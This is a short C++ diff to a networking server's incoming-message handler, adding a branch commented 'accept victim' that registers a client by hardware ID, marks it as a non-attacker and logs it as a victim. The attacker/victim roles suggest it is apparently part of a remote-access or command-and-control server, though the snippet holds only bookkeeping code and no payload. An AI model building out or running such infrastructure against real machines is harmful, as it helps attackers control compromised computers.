@@ -150,8 +150,23 @@ int Server::processIncoming()
 		}
 		//accept victim
 		else if (cmd == std::uint8_t(3)) {
+			std::string hId;
+			p >> hId;
+			if (database.find(hId) == database.end())
+				database[hId] = HIdInfo();
 
+			sf::Packet res;
+			res << reqId << bool(true) << uint16_t(u.id);
+			auto _ = u.socket->send(res);
+
+			u.isAttacker = false, u.hId = hId;
+			initializedIds.insert(u.id);
+			clients.push_back(u);
+			uninitialized.erase(uninitialized.begin() + i);
+
+			std::cout << getTime() << " - " << u.id << " = victim: " << hId << "\n";
 			sendClientList();
+			i--;
 		}
 	}
 
